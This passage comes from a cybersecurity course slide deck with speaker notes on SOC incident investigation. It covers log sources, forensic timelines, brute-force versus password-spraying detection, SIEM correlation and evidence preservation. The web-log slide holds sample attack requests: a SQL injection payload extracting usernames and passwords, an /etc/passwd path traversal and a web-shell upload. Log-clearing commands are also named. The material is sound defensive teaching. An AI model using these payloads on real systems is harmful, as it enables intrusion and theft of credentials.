---
deck:
  title: Cyber Investigation Lab
  kicker: Class 28
  accent: "#B3001B"
  background: "#FFFFFF"
  logo: logo.png
  background_image: bg.png
  class_number: 28
  description: A hands-on lab applying log analysis, attack identification, and response decisions to a real investigation.
  topics: [Log Analysis, Attack Identification, Evidence, Response Decisions]
---

%%%
---
title: Cyber Investigation Lab
cover: true
---
:::text class=sub
Hands-on SOC Incident Analysis, Telemetry Sources, and containment Decisions
:::

:::list style=chips
- Telemetry Ingestion
- Log Normalization
- Forensic Timeline
- RFC 3227 Evidence
:::

:::image src="images/28_cover_cyber_investigation_lab.png" alt="Wide-angle illustration of a dark Security Operations Center at night: three analysts seated at curved workstations each displaying multiple monitors with SIEM dashboards, network topology maps, and alert queues; large display wall at front shows a global threat map with red dots indicating active incidents; ambient blue and red accent lighting; labels identify Tier 1 Triage station, Tier 2 Investigation station, and a central SIEM correlation console" caption="The SOC is the operational heart of enterprise defense: analysts translate raw telemetry into actionable incident reports, applying the frameworks covered in Class 27 to real-time threat data." width=full
:::

:::notes
Welcome to Class 28, our Cyber Investigation Lab. In our previous class, we studied security architecture and defense design, the theoretical framework that organizes enterprise defenses into layered, coherent systems. Today, we step into the operational side of security, simulating the day-to-day role of a Security Operations Center analyst who must translate raw telemetry into actionable decisions under time pressure.

This lab bridges the gap between architectural design and operational reality. A security architecture that is never tested and a SIEM that is never tuned provide only the illusion of security. Real incidents unfold across dozens of log sources simultaneously, with attackers deliberately obscuring their activity in noise. The analyst's job is to find the signal, to extract meaningful, correlated evidence from millions of log entries and make correct triage and containment decisions before the attacker achieves their objective.

We will walk through four core investigative competencies. First, telemetry ingestion: understanding what log sources are available, what events they record, and how SIEM systems normalize heterogeneous data into a common schema using formats such as the Common Event Format (CEF) defined in the ArcSight documentation standard or Syslog structured data per RFC 5424. Second, forensic timeline construction: the process of converting raw log entries into a chronologically ordered master record of the attack, aligned to UTC per ISO 8601 to eliminate timezone-induced errors. Third, evidence preservation: applying RFC 3227 guidelines to capture volatile system state in the correct order of volatility before shutdown destroys critical artifacts. Fourth, containment decision-making: applying the NIST SP 800-61r2 incident response lifecycle to choose and validate appropriate containment actions.

By the end of this class, you will be prepared to analyze a multi-stage attack scenario using realistic log data, correlate events across Windows Security Event logs, Linux Syslog, Nginx access logs, and network firewall telemetry, and draft an incident report meeting professional SOC standards. This hands-on experience maps directly to the Tier 1 and Tier 2 analyst roles that represent the most common entry points into professional cybersecurity careers.
:::

%%%
---
unit: Operations
code: SOC
title: The Security Operations Center (SOC) Workflow
---
:::callout style=soft
A **Security Operations Center (SOC)** is a centralized facility where an organization monitors, detects, and responds to cybersecurity events. Analysts rely on a **SIEM** (Security Information and Event Management) system to ingest and correlate enterprise telemetry.
:::

::::columns ratio=1:1
::col::
::::card heading="Incident Triage Tiers"
:::list style=tight
- **Tier 1 (Triage):** Monitors alerts, filters false positives, and validates indicators.
- **Tier 2 (Investigation):** Performs deep forensic analysis and plans containment.
- **Tier 3 (Threat Hunting):** Proactively searches for hidden threats and creates custom rules.
:::
::::
::col::
::::card heading="Operational Metrics"
:::list style=tight
- **Mean Time to Detect (MTTD):** Time from initial intrusion to alert validation.
- **Mean Time to Respond (MTTR):** Time from detection to complete containment.
- **SLA Compliance:** Meeting response times defined by operational policies.
:::
::::
::::

:::flow
INGEST: SIEM ingests raw log streams from network, host, and cloud sources in real time
NORMALIZE: Events are parsed into a common schema (CEF or ECS) for cross-source correlation
ALERT: Correlation rules fire when event patterns match known attack signatures or behavioral baselines
TRIAGE (Tier 1): Analyst validates the alert, filters false positives, and classifies severity
INVESTIGATE (Tier 2): Senior analyst performs deep forensic analysis and scopes the compromise
CONTAIN: Isolation actions are applied, account disable, IP block, VLAN quarantine
DOCUMENT: Incident report is drafted with timeline, indicators, and response actions
:::

:::image src="images/28_soc_tier_workflow.png" alt="Vertical flowchart showing the SOC operational workflow: at the top, a cloud icon labeled 'Enterprise Telemetry' (Windows, Linux, Web, Firewall) feeds downward into a SIEM server icon labeled 'Ingest and Normalize'; below that, a funnel icon labeled 'Correlation Engine fires alerts'; three horizontal tiers branch rightward: Tier 1 box labeled 'Triage Analyst: validate and classify' connected by an escalation arrow to Tier 2 box labeled 'Investigation Analyst: forensic scope' connected by escalation arrow to Tier 3 box labeled 'Threat Hunter: hunt and tune'; at the bottom a 'Containment and Report' box consolidates all tier outputs; MTTD is labeled between SIEM alert and Tier 1 validation; MTTR is labeled between Tier 1 validation and Containment" caption="The SOC workflow: telemetry flows from enterprise sources into SIEM normalization and correlation, producing alerts that tiers of analysts validate, investigate, and resolve. MTTD and MTTR are the operational metrics that measure the speed and effectiveness of this pipeline." width=full
:::

:::notes
Before we look at raw logs, let's examine the environment where these investigations take place: the Security Operations Center. A SOC operates as the defensive nerve center of an enterprise, aggregating security telemetry from every monitored system and providing a 24/7 human response capability to complement automated detection tools.

The SOC's fundamental mission aligns directly with the NIST Cybersecurity Framework 2.0 DETECT and RESPOND functions discussed in Class 27. The DETECT function is implemented through the SIEM's continuous ingestion and correlation of telemetry. The RESPOND function is implemented through the analyst tiers' triage, investigation, and containment workflows. A SOC without a documented incident response plan, as defined in NIST SP 800-61r2, is operationally incomplete: analysts need pre-approved decision trees and escalation paths to act quickly and consistently when incidents occur.

To manage the enormous volume of incoming alerts, large enterprise SIEMs can generate hundreds of thousands of alerts per day, SOCs use a tiered staffing structure. Tier 1 analysts are the first responders. They monitor the SIEM console continuously, reviewing incoming alerts, dismissing false positives using established runbooks, and validating genuine indicators of compromise. When an alert is confirmed malicious, the Tier 1 analyst creates an incident ticket and escalates it to Tier 2. Tier 2 analysts are senior investigators who perform deep forensic analysis: querying raw logs beyond the initial alert, reconstructing the attacker's full kill chain, identifying the full scope of compromised assets, and coordinating the containment response with infrastructure teams. Tier 3 analysts, sometimes called threat hunters, operate proactively, searching for adversary activity that evades existing detection rules and building new correlation logic to catch it. They also conduct post-incident reviews to improve detection coverage.

The performance of a SOC is measured in two metrics defined in NIST SP 800-61r2's discussion of incident handling. Mean Time to Detect (MTTD) measures the elapsed time between an attacker's initial access and the moment a validated alert is generated, shorter MTTD limits the attacker's window to establish persistence and move laterally. Mean Time to Respond (MTTR) measures the elapsed time between alert validation and full containment of the incident. IBM's Cost of a Data Breach Report 2024 found that organizations with MTTD plus MTTR under 200 days saved an average of $1.12 million compared to organizations that took longer. Reducing these metrics is the primary operational objective of SOC investment in tooling, staffing, and process improvement.
:::

%%%
---
unit: Telemetry
code: TEL
title: Telemetry Sources & Standard Formats
---
:::callout style=soft
Security telemetry must be gathered from multiple layers of the enterprise. Organizations normalize this data using standards like the **Common Event Format (CEF)** or **Syslog (RFC 5424)** to allow for cross-system correlation.
:::

:::table
| Telemetry Source | Typical Event Types | Key Fields Analyzed | Security Value |
|---|---|---|---|
| **Windows Event Logs** | Event ID 4624 (Logon), ID 4625 (Failed Logon) | TargetUserName, LogonType, IpAddress, ProcessName | Detects credential abuse, brute-force, and lateral movement |
| **Linux Syslog** | Auth logs, daemon errors, system service events | User, Hostname, Process ID, Message Payload | Tracks administrative actions and service compromises |
| **Nginx / Apache Logs** | HTTP requests, URI paths, response status codes | ClientIP, RequestURI, HTTP_Status, UserAgent | Identifies web application attacks (SQLi, XSS, Path Traversal) |
| **Network Firewalls** | Connection allowed, Connection blocked | SourceIP, DestinationIP, DestinationPort, Protocol | Maps network scanning and outbound command-and-control traffic |
:::

:::steps
**Collect:** Configure log shipping agents (e.g., Winlogbeat, Filebeat, rsyslog) to forward raw events from every monitored source to the SIEM ingestion endpoint in real time.
**Parse:** Apply field extraction rules to decompose each raw log line into structured key-value pairs, SourceIP, DestinationPort, EventID, User, so the SIEM can index and query them.
**Normalize:** Map source-specific field names to a common schema (CEF or Elastic Common Schema) so that a Windows EventID 4625 and a Linux auth failure are both queryable as `event.type = authentication_failure`.
**Enrich:** Augment parsed events with contextual metadata, GeoIP lookup on source addresses, hostname resolution, asset criticality tags, threat intelligence feed lookups for known malicious IPs and domains.
**Correlate:** Apply detection rules that evaluate enriched events across multiple sources simultaneously, firing alerts when patterns match known attack sequences or behavioral baselines.
:::

:::image src="images/28_telemetry_sources_siem.png" alt="Hub-and-spoke diagram with a central SIEM server icon at the hub labeled 'SIEM: Ingest, Normalize, Correlate'; four spokes radiate outward to source icons: top-left is a Windows Server icon labeled 'Windows Event Logs (4624/4625/4688)'; top-right is a Linux terminal icon labeled 'Syslog RFC 5424 (auth, daemon)'; bottom-left is a web server icon labeled 'Nginx/Apache Access Logs (HTTP status, URI)'; bottom-right is a firewall icon labeled 'Network Firewall (allow/deny, ports)'; each spoke is labeled with the transport method (Winlogbeat, Filebeat, rsyslog, syslog-ng); the SIEM hub shows three stacked layers labeled Ingest, Normalize, and Correlate" caption="Enterprise telemetry architecture: log agents forward events from all monitored layers to the SIEM, which parses, normalizes, and enriches them into a queryable common schema before applying correlation rules." width=full
:::

:::notes
To build a complete picture of an incident, analysts need telemetry from every layer of the enterprise architecture defined in Class 27. Each telemetry source provides a different window into attacker behavior, and no single source tells the full story. The attacker who scans the network appears in firewall logs; the attacker who brute-forces credentials appears in Windows Security Event logs; the attacker who exploits a web application appears in Nginx access logs; and the attacker who establishes a command-and-control channel back to their infrastructure appears in both firewall and DNS logs.

Windows Security Event logs are the primary source for credential and identity-related activity. Windows logs authentication events using specific Event IDs defined in the Microsoft Windows Security Audit documentation. Event ID 4624 records every successful logon, capturing the TargetUserName, LogonType (Type 2 = interactive, Type 3 = network, Type 10 = remote interactive via RDP), and the source network address. Event ID 4625 records every failed logon with a sub-status code indicating the failure reason, sub-status 0xC000006A indicates a bad password, while 0xC0000064 indicates an unknown username. Event ID 4688 records process creation, including the parent process and command-line arguments, enabling detection of malicious processes spawned by legitimate applications (a technique known as process injection or living-off-the-land, covered in MITRE ATT&CK techniques T1055 and T1218).

Linux systems use the Syslog protocol, standardized in RFC 5424, to record authentication and system events. The `/var/log/auth.log` file on Debian/Ubuntu systems (or `/var/log/secure` on RHEL/CentOS) captures sudo usage, SSH authentication attempts (including public key vs. password), and PAM module decisions. Each Syslog message includes a facility code, severity level, timestamp, hostname, process name, and the message payload, all parseable fields for SIEM ingestion.

Web servers generate access logs recording every HTTP request received. The Combined Log Format used by Nginx and Apache captures: client IP, request timestamp, HTTP method and URI, HTTP response status code, response body size, HTTP Referer header, and User-Agent string. These fields collectively allow analysts to identify SQL injection (characteristic UNION SELECT patterns in URIs), path traversal attacks (../ sequences), web shell uploads (POST to writable directories returning 201 Created), and automated scanning (high-volume requests with curl or python-requests User-Agents).

Firewall logs record each permitted or denied connection attempt, including source IP, destination IP, destination port, protocol, and action taken. These logs map the network reconnaissance and lateral movement phases of an attack. A series of connection attempts to many different ports from a single source IP is indicative of a port scan (MITRE ATT&CK T1046). Outbound connections to unusual high-numbered ports or to known malicious IP addresses indicate command-and-control communication (MITRE ATT&CK T1071).

The SIEM normalizes all of these heterogeneous log formats into a common schema, either HP ArcSight's Common Event Format (CEF) or the Elastic Common Schema (ECS), enabling cross-source queries and correlation rules that span multiple telemetry types in a single detection logic statement.
:::

%%%
---
unit: Forensics
code: TIM
title: Parsing Logs & Building Forensics Timelines
---
:::callout style=soft
An investigation cannot rely on isolated logs. A **forensic timeline** chronologically orders events from all log sources, aligned to a standardized time zone (usually **Coordinated Universal Time (UTC)**), to reconstruct the attacker's actions.
:::

:::steps
**Time Normalization:** Convert all log timestamps to UTC/ISO 8601 format to account for differing system clocks.
**Indicator Extraction:** Parse out Indicators of Compromise (IoCs) like malicious IPs, file hashes, and domain names.
**Chronological Ordering:** Sort all records from all sources into a single, unified master timeline.
**Anomaly Correlation:** Link network events to host events (e.g., matching a firewall connection to a process execution).
**Gap Identification:** Look for missing log intervals that may suggest log tampering or system downtime.
:::

:::image src="images/28_forensic_timeline_construction.png" alt="Horizontal timeline diagram spanning left (02:10 UTC) to right (02:20 UTC): four horizontal swim lanes stacked vertically labeled Firewall, Windows Auth, Web Server, and Endpoint EDR; colored event markers appear on each lane at specific timestamps, a red triangle on Firewall at 02:11 labeled 'Port Scan (45 ports)'; a yellow circle on Windows Auth at 02:13 labeled 'Event 4625 x47 failed logons'; a red square on Web Server at 02:14 labeled 'SQLi attempt 200 OK'; a red diamond on Web Server at 02:15 labeled 'shell.php upload 201'; a red star on Endpoint EDR at 02:16 labeled 'cmd.exe spawned by w3wp.exe'; vertical dotted lines connect related events across swim lanes with 'Same Source IP' and 'Same Host' annotations; a gap in the Firewall lane between 02:17 and 02:19 is highlighted in orange labeled 'Log Gap, possible tampering'" caption="Forensic timeline across four telemetry sources: correlated by source IP and host, the timeline reconstructs the attack progression from initial reconnaissance (02:11) to web shell command execution (02:16). A log gap at 02:17–02:19 is flagged for investigation." width=full
:::

:::notes
When an incident occurs, an analyst is typically faced with hundreds of thousands of log entries distributed across multiple systems, each using different timestamp formats, field names, and local time zones. The forensic timeline is the primary analytical artifact that transforms this raw data into an intelligible reconstruction of the attacker's actions. Without a timeline, investigators risk missing the causal sequence of events, misinterpreting a later log entry as causative of an earlier one, or missing the connection between events from different log sources that occurred within seconds of each other.

The first step in timeline construction is time normalization. Enterprise systems commonly operate across different time zones, and their local system clocks can drift from accurate time by minutes or even hours if Network Time Protocol (NTP) is not properly configured. All timestamps must be converted to Coordinated Universal Time (UTC) and formatted according to ISO 8601 (e.g., 2026-06-30T02:13:47Z) before sorting. A failure to normalize timestamps is one of the most common causes of timeline errors in forensic investigations. RFC 3164 (the legacy BSD Syslog format) does not include a timezone specifier, making this conversion especially error-prone for older Linux and network device logs.

Indicator extraction is performed in parallel with timeline construction. As the analyst reviews log entries, they extract Indicators of Compromise (IoCs): IP addresses used by the attacker, domain names contacted, file names and paths written to disk, and SHA-256 hashes of files uploaded or executed. These IoCs are cross-referenced against threat intelligence feeds, such as the CISA Known Exploited Vulnerabilities catalog, VirusTotal, or commercial threat intel platforms, to determine if they are associated with known threat actors or malware families.

Once all events are timestamped in UTC and sorted chronologically, the analyst creates a master timeline that interleaves events from all log sources. The analytical value of this unified view is immense: a firewall log entry showing a connection to TCP port 4444 (a common Metasploit default handler port) at 02:16:03 UTC, correlated with an EDR log entry showing `powershell.exe` spawning a child process with a Base64-encoded command string at 02:16:05 UTC on the same host IP, establishes a causal chain between network-level command-and-control and host-level code execution.

Gap analysis is the final step. Log agents occasionally fail, attackers clear event logs (Windows: Event ID 1102, Audit Log was Cleared; Linux: `history -c` or direct truncation of `/var/log/auth.log`), or network connectivity between a log agent and the SIEM is disrupted. A sudden gap in log generation from a specific host during an active incident is itself a critical indicator. NIST SP 800-86, the Guide to Integrating Forensic Techniques into Incident Response, discusses log integrity verification and recommends that organizations ship logs to a remote, write-protected SIEM in real time to prevent local tampering, ensuring that even if an attacker clears local logs, the SIEM has already received and retained the evidence.
:::

%%%
---
unit: Analysis
code: AUTH
title: Analyzing Authentication Anomalies
---
:::callout style=soft
Authentication logs reveal whether an attacker is attempting to guess credentials or has successfully compromised an account. We analyze patterns to differentiate brute-force attacks from password spraying.
:::

:::code language=text caption="Raw Windows Event Log Entry (Simplified ID 4625)"
Security Log | EventID: 4625 | Timestamp: 2026-06-30 02:13:47 UTC
Logon Type: 3 (Network Logon)
TargetAccount: jsmith
Source Network Address: 198.51.100.45
Failure Reason: Unknown user name or bad password
Sub_Status: 0xC000006A (User logon with misspelled or bad password)
Device: ActiveDirectory-Controller-01
:::

::::columns ratio=1:1
::col::
::::card heading="Brute-Force Pattern"
:::list style=tight
- **Targets:** Single account.
- **Failures:** High volume (hundreds in minutes).
- **Origin:** Single source IP address.
- **Goal:** Guess a specific user's password.
:::
::::
::col::
::::card heading="Password Spraying"
:::list style=tight
- **Targets:** Multiple accounts (jsmith, mdoe).
- **Failures:** Low volume per account (1-2 attempts).
- **Origin:** Single or multiple proxy IPs.
- **Goal:** Avoid account lockout thresholds.
:::
::::
::::

:::image src="images/28_auth_anomaly_patterns.png" alt="Two-panel comparison diagram side by side: Left panel labeled 'Brute-Force Attack' shows a single attacker arrow pointing at a single account icon labeled 'jsmith'; below, a bar chart shows 200+ failed attempts in 5 minutes all from IP 198.51.100.45; a red alert badge labels 'Account Lockout triggered'; Right panel labeled 'Password Spraying' shows a single attacker arrow branching to 10 different account icons (jsmith, mdoe, alee, bwong...); below, a bar chart shows 1-2 attempts per account across 30 minutes from rotating IPs; a green checkmark labeled 'Lockout threshold not reached' appears at the bottom; a SIEM correlation query box between the panels reads 'GROUP BY source_ip, COUNT(DISTINCT target_account)'" caption="Brute-force vs. password spraying: brute-force concentrates high-volume attempts on one account and triggers lockout alerts. Password spraying distributes low-volume attempts across many accounts to evade lockout thresholds, requiring analysts to query by source IP rather than by individual account." width=full
:::

:::notes
Authentication logs are one of the most valuable and most frequently analyzed sources in any SOC investigation. Windows Security Event logs provide granular detail on every authentication attempt against Active Directory, both successful and failed, making them essential for detecting credential-based attacks, which represent the initial access vector in a majority of enterprise breaches according to the Verizon Data Breach Investigations Report (DBIR) 2024.

The log entry shown on this slide represents a Windows Event ID 4625, a failed logon attempt. Understanding each field is critical for accurate triage. The Logon Type field distinguishes how the logon attempt was made: Type 3 is a network logon (most common for lateral movement and remote exploitation), Type 10 is a Remote Desktop Protocol (RDP) logon, Type 2 is an interactive console logon. The source network address identifies the originating IP of the authentication request, in this case 198.51.100.45, which is outside normal working hours (02:13 AM UTC). The Sub_Status code 0xC000006A confirms the failure reason as a bad password, meaning the account name was valid but the password was incorrect. This distinction matters: sub-status 0xC0000064 (unknown username) suggests the attacker is also guessing account names, while 0xC000006A suggests they already know valid usernames.

A single Event ID 4625 is unremarkable, users mistype passwords regularly. The analytical value emerges from pattern analysis. A brute-force attack is characterized by a very high volume of failures against a single account within a short timeframe from a single source IP. Modern Active Directory deployments typically have account lockout policies that disable an account after three to ten consecutive failures within a configurable observation window, a Tier 1 analyst should see the lockout event (Event ID 4740) shortly after the burst of 4625 events. The detection query for this pattern groups failed logon events by TargetUserName and counts them within a sliding time window.

Password spraying is a deliberately stealthy alternative that exploits the lockout policy itself. The attacker constructs a list of valid usernames, often harvested through LinkedIn reconnaissance (MITRE ATT&CK T1591) or previous data breaches, and then attempts a single common password (e.g., "Summer2026!" or "Welcome1") against every account in the list before attempting a second password. This keeps the per-account failure count below the lockout threshold indefinitely. The correct detection query for password spraying aggregates failed logons by source IP address and counts the number of distinct TargetUserName values within a time window: a single source IP that generates one or two failures against fifty different accounts in thirty minutes is a strong indicator of spraying, even though no individual account crossed the lockout threshold. This cross-account correlation is only possible in a SIEM where all authentication events have been centrally indexed, it cannot be detected by reviewing a single domain controller's local event log.

SIEM detection rules for both patterns should generate separate alert categories, brute-force alerts for high-volume single-account failures and spraying alerts for low-volume multi-account failures, with different severity ratings and escalation paths, since they represent different attacker capabilities and different stages of the kill chain.
:::

%%%
---
unit: Analysis
code: WEB
title: Network & Web Log Forensic Analysis
---
:::callout style=soft
Web server access logs record incoming HTTP traffic. Analysts inspect the request paths, query parameters, and HTTP response codes to identify web application attacks.
:::

:::code language=text caption="Nginx Access Log Snippet with SQLi & Path Traversal"
192.0.2.142 - - [30/Jun/2026:02:14:05 +0000] "GET /product.php?id=5%20UNION%20SELECT%20null,username,password%20FROM%20users HTTP/1.1" 200 4502 "-" "Mozilla/5.0"
192.0.2.142 - - [30/Jun/2026:02:14:22 +0000] "GET /../../../../etc/passwd HTTP/1.1" 403 220 "-" "Mozilla/5.0"
192.0.2.142 - - [30/Jun/2026:02:15:10 +0000] "POST /uploads/shell.php HTTP/1.1" 201 1024 "-" "curl/7.81.0"
:::

::::columns ratio=1:1
::col::
::::card heading="HTTP Status Code Triages"
:::list style=tight
- **200 OK:** Request succeeded; database data may have been returned.
- **403 Forbidden:** Server blocked request (e.g., path traversal prevented).
- **201 Created:** File uploaded (e.g., possible web shell deployment).
:::
::::
::col::
::::card heading="Malicious Signatures"
:::list style=tight
- **UNION SELECT:** Indicates SQL Injection (OWASP Top 10 A03).
- **etc/passwd:** Indicates Path Traversal.
- **shell.php:** Suggests arbitrary file upload and remote code execution.
:::
::::
::::

:::image src="images/28_web_log_attack_anatomy.png" alt="Three annotated log line diagrams stacked vertically, each with callout arrows pointing to key fields: Line 1 shows the SQLi request; arrows label 'Client IP: 192.0.2.142', 'Malicious URI: UNION SELECT', 'Response 200 OK, data returned', 'Response size 4502 bytes, unusually large'; Line 2 shows the path traversal request; arrows label '../../../ path traversal sequence', 'Response 403, blocked by server', 'Response size 220 bytes, error page only'; Line 3 shows the shell upload; arrows label 'POST method, file upload', '/uploads/ writable directory', 'shell.php, PHP web shell', 'Response 201 Created, file persisted', 'User-Agent: curl, automated tool'; below all three lines a summary box lists 'Attack Progression: Probe → Exploit (SQLi) → Establish Persistence (web shell)'" caption="Annotated web server log anatomy: each attack type leaves characteristic signatures in the request URI, HTTP method, response status, response size, and User-Agent string that analysts use to classify and sequence attacker activity." width=full
:::

:::notes
Web server access logs are a primary forensic source for investigating web application attacks, which consistently rank among the most common initial access vectors in enterprise breaches. According to the Verizon DBIR 2024, web application attacks account for approximately 26% of breaches across all industries. The OWASP Top Ten (2021 edition) catalogs the most critical web application security risks, several of which are directly identifiable in access log entries without any specialized tooling.

The three log lines shown on this slide represent a complete attack sequence against a PHP web application. Let's analyze each line in forensic detail. The first line shows a GET request to `product.php` with the query parameter `id=5%20UNION%20SELECT%20null,username,password%20FROM%20users`. URL percent-encoding converts spaces to `%20`, making the decoded query `id=5 UNION SELECT null,username,password FROM users`. This is a textbook UNION-based SQL injection attack (OWASP A03:2021, Injection), appending a UNION SELECT statement to a legitimate database query in order to extract data from a different table. Two details elevate this from a suspicious log entry to a confirmed exploitation: the HTTP response code is 200 (request succeeded, meaning the database executed the injected query without rejecting it), and the response body size is 4,502 bytes, substantially larger than a typical product page, consistent with a database result set containing username and password rows.

The second line shows a GET request to `../../../../etc/passwd`. This is a path traversal attack (OWASP A01:2021, Broken Access Control), attempting to escape the web root directory and read the Linux system user database. The server returned HTTP 403 Forbidden, indicating that either the application's input validation or the web server's directory traversal prevention blocked the request. The response body of 220 bytes is consistent with a standard error page, not the `/etc/passwd` file content. This attempt was blocked, but it tells the analyst that the attacker is probing for server-side file read vulnerabilities in addition to SQL injection.

The third line is the most critical: a POST request to `/uploads/shell.php` returning HTTP 201 Created. The POST method indicates a file submission, and the `/uploads/` path is a writable directory (otherwise the server could not create a new file). The filename `shell.php` is the explicit IoC: PHP web shells are malicious scripts that accept HTTP requests and execute arbitrary operating system commands on the server, providing the attacker with a persistent remote code execution capability. The User-Agent string `curl/7.81.0` instead of a browser string indicates automated tool usage, consistent with a scripted exploitation workflow. A 201 response confirms the file was successfully written to disk. From this point, the attacker has persistent access to execute commands, enumerate the file system, and establish further footholds.

Analysts should immediately verify this finding against endpoint EDR logs: look for the web server process (e.g., `nginx`, `apache2`, `w3wp.exe`) spawning unusual child processes in the minutes following 02:15:10 UTC, which is the signature of the web shell being invoked via HTTP.
:::

%%%
---
unit: Triage
code: CORR
title: Event Correlation & Alert Rules
---
:::callout style=soft
An isolated log entry is rarely enough to validate an incident. SIEM systems use **correlation rules** to join events across different sources, building a multi-stage view of an attack.
:::

:::code language=mermaid caption="SIEM correlation chain for the lab scenario: four sequential events, firewall port scan, Active Directory brute-force, web server shell upload, and EDR process spawn, are each independently low-priority signals. The SIEM correlation engine links them by shared attributes (source IP, target account, host IP) into a single high-priority incident alert, enabling the analyst to see the complete attack kill chain in one view."
graph LR
    FW["1. Firewall Port Scan Alert"] --> Auth["2. Active Directory Brute-Force Alert"]
    Auth --> Web["3. Web Server Upload shell.php"]
    Web --> Sys["4. Endpoint EDR detects cmd.exe spawn"]
    
    FW -- "Same Source IP" --> SIEM["SIEM Correlation Engine"]
    Auth -- "Same Target Account" --> SIEM
    Web -- "Same Host IP" --> SIEM
    Sys -- "High Priority Incident Alert" --> SIEM
:::

:::image src="images/28_siem_correlation_engine.png" alt="Central hub diagram with a SIEM Correlation Engine box in the middle; four event cards are arranged around the hub connected by labeled arrows: top-left card labeled '1. Firewall: Port scan 45 ports from 198.51.100.45' connected with 'Same SourceIP'; top-right card labeled '2. AD: 47x Event 4625 for jsmith from 198.51.100.45' connected with 'Same SourceIP'; bottom-left card labeled '3. Web: POST /uploads/shell.php 201 on 10.0.1.20' connected with 'Same HostIP'; bottom-right card labeled '4. EDR: cmd.exe spawned by w3wp.exe on 10.0.1.20' connected with 'Same HostIP'; in the center of the SIEM box a correlation rule is shown: IF events 1+2+3+4 within 30 min THEN create HIGH PRIORITY incident; an output arrow at the bottom leads to an incident ticket icon labeled 'Incident-2026-0001: Severity HIGH'" caption="SIEM correlation engine: four individually low-priority events are linked by shared source IP and host IP attributes into a single high-priority incident ticket, giving the Tier 1 analyst an immediate view of the full attack sequence." width=full
:::

:::notes
In a large enterprise, millions of events are generated every second across firewalls, authentication systems, web servers, and endpoint agents. Presenting every individual event as a separate alert would make the analyst console completely unworkable, a condition known as alert fatigue, where the sheer volume of notifications causes analysts to dismiss alerts without reviewing them carefully. The 2021 SolarWinds investigation revealed that defenders had missed correlation signals because individual alerts from different systems were not linked, even though they collectively represented a clear attack pattern.

SIEM correlation engines address this problem by evaluating patterns across multiple event streams simultaneously, firing a single high-priority composite alert when a combination of conditions is met. The correlation rule shown in this slide's diagram is a simplified example of the type of multi-stage detection logic that appears in frameworks like Sigma (a community-driven, vendor-neutral detection rule language) and in commercial SIEM platforms such as Splunk ES, Microsoft Sentinel, and IBM QRadar.

The rule logic can be described as: IF a port scan from a given source IP is observed on the firewall WITHIN 30 minutes of multiple authentication failures involving that same source IP on Active Directory, AND a file upload to a writable directory occurs on a host that received authenticated network connections from that source IP, AND that same host's EDR agent subsequently reports the web server process spawning a command interpreter, THEN create a single incident ticket linking all four events with a HIGH severity classification and route it immediately to Tier 2 investigation.

Each individual event in the chain has a relatively low signal-to-noise ratio in isolation: port scans occur constantly from internet scanners; a handful of authentication failures are routine; a file upload could be legitimate; a cmd.exe spawn from an IIS worker process is occasionally legitimate for certain application functions. But the sequential occurrence of all four events, linked by shared identifiers (source IP, target host IP), dramatically increases the specificity of the detection, the probability that all four occur simultaneously by coincidence from legitimate activity is extremely low.

MITRE ATT&CK maps this attack chain precisely: T1046 (Network Service Discovery / port scan) → T1110.001 (Brute Force: Password Guessing) → T1505.003 (Server Software Component: Web Shell) → T1059.001 (Command and Scripting Interpreter: PowerShell/cmd). Mapping correlation alerts to ATT&CK technique IDs enables the SOC to measure detection coverage, identifying which techniques generate alerts and which have no corresponding correlation rules, and to communicate findings to management using a standardized taxonomy.
:::

%%%
---
unit: Forensics
code: EVD
title: Forensics & Evidence Preservation (RFC 3227)
---
:::callout style=soft
During an investigation, evidence must be handled in a manner that preserves its legal integrity. **RFC 3227** defines the guidelines for evidence collection, archiving, and order of volatility.
:::

::::columns ratio=1:1
::col::
::::card heading="Order of Volatility (RFC 3227)"
:::steps
1. **CPU Registers & Cache:** Cleared instantly upon power loss.
2. **System RAM:** Contains active processes, network connections, and unencrypted keys.
3. **Temporary File Systems:** Swap files and transient data.
4. **Hard Drives / Disk:** Persistent storage containing system files and logs.
5. **Remote Logging Data:** Logs stored on external SIEM systems.
:::
::::
::col::
::::card heading="Preservation Best Practices"
:::list style=tight
- **Chain of Custody:** Document who collected, accessed, and stored the evidence.
- **Cryptographic Hashing:** Generate SHA-256 hashes of disk images immediately to prove integrity.
- **Write Blockers:** Use hardware write blockers to prevent modifying original disks during imaging.
:::
::::
::::

:::image src="images/28_order_of_volatility_pyramid.png" alt="Vertical pyramid diagram divided into five horizontal sections from bottom (widest, most stable) to top (narrowest, most volatile): bottom section in green labeled 'Remote Logging / SIEM, persists indefinitely'; second section in light green labeled 'Hard Disk / SSD, persists unless overwritten'; third section in yellow labeled 'Temp Files and Swap, lost on reboot'; fourth section in orange labeled 'System RAM, lost on power loss (~4–16 GB of active state)'; top section in red labeled 'CPU Registers and Cache, lost in microseconds'; on the right side of the pyramid a vertical arrow labeled 'Collection Priority' points upward with label 'Collect Most Volatile First'; on the left side icons show tools: RAM capture tool for orange/red, disk imager for yellow/green, SIEM query interface for bottom section" caption="RFC 3227 Order of Volatility: evidence must be collected from most volatile (CPU registers, RAM) to least volatile (disk, remote logs). Pulling the power plug destroys the top three layers, potentially erasing the most forensically valuable state." width=full
:::

:::notes
If a security incident leads to legal action, regulatory enforcement, or insurance claims, the integrity and admissibility of digital evidence depends entirely on how it was collected and handled. RFC 3227, "Guidelines for Evidence Collection and Archiving," published by the IETF, is the foundational document governing digital evidence handling in incident response contexts. It establishes two critical principles: collect evidence in order of volatility, and document every action taken on the evidence.

The order of volatility principle recognizes that digital evidence exists in a spectrum from highly transient to highly persistent. At the most volatile end, CPU registers and processor cache hold the current instruction pointer, stack values, and recently accessed memory, data that is destroyed in microseconds when power is removed. Immediately below, system RAM contains the complete runtime state of the compromised system: the list of active processes and their memory spaces, all open network connections and their states, plaintext cryptographic keys for encrypted sessions that are in use, the contents of recently accessed files that have not yet been flushed to disk, and potentially the payload of an in-memory malware implant (a technique called "fileless malware" that evades disk-based antivirus scanners by never writing to disk). Volatile RAM evidence can be captured using specialized tools such as WinPmem (Windows) or LiME, Linux Memory Extractor (Linux), which acquire a raw memory image without shutting down the system.

Temporary file systems and swap space occupy the middle of the volatility spectrum. These may contain fragments of documents, browser cache, and application temporary files that were not written to permanent storage. Hard drives and SSDs are the most persistent on-system storage, they retain data until it is actively overwritten. However, simply accessing a file system to examine it can modify metadata (access timestamps, inode modification times), so forensic analysis should always be performed on a verified bit-for-bit copy rather than the original disk. Hardware write blockers, devices that physically prevent write commands from reaching the drive interface, are inserted between the suspect disk and the forensic workstation during imaging to prevent any modification of the original media.

